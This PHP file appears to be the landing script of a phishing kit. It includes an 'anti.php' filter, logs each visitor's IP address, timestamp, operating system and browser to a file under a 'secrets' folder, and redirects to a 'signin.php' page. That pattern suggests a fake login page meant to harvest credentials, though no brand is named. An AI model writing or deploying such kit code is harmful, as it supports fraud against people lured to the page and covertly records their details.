<?php
date_default_timezone_set('GMT');
ini_set('display_errors', true);
require_once '../inc/session.php';
require_once '../inc/inc.php';
require_once '../inc/functions.php'; 
require_once 'anti.php';



	$dateNow = date("d/m/Y h:i:s A");
	$ip = $_SERVER['REMOTE_ADDR'];
	$_SESSION['ip_countryName'] = "United Kingdom";
	$_SESSION['ip_countryCode'] = "GB";
	$_SESSION['os']             = getOs();
	$_SESSION['browser']        = getBrowser();
	$code    = "{$ip} | {$dateNow} | {$_SESSION['os']} | {$_SESSION['browser']}\r\n";
	$save    = fopen("../secrets/access.txt", "a+");
	fwrite($save, $code);
	fclose($save);
	
header("Location: signin.php");
exit;
?>
